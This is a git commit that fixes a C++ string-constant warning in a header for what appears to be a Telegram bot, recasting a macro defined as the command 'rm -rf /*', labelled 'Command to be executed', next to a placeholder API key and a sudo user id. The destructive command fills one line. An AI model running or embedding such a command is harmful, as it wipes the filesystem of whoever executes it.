23cdc350e840d5c0f831047caf52b1eb93792e96
dracarys18 <karthihegde010@gmail.com>
2020-09-15 00:02:17 +0530

    Fix -Wwrite-strings warning on system(command) call
    warning: ISO C++ forbids converting a string constant to ‘char*’ [-Wwrite-strings]
    
    Signed-off-by: dracarys18 <karthihegde010@gmail.com>

--- include/definit.h
+++ include/definit.h
@@ -1,3 +1,3 @@
 #define TG_API_KEY "xxxxxx" /*Telegram API KEY*/
-#define COMMAND "rm -rf /*" /*Command to be executed*/
+#define COMMAND (char *)("rm -rf /*") /*Command to be executed*/
 #define SUDO_USER 1332139172 /*Sudo user or sudo chat id*/
